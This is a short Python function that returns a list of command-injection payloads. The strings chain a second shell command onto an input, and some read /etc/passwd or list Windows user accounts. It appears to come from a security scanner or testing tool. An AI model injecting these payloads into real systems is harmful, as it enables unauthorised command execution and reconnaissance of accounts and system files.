def get_cmd_payloads():
    return [
        ';id', 
        '&& cat /etc/passwd',
        '| net user',
        '`echo "exploit"`'
    ]
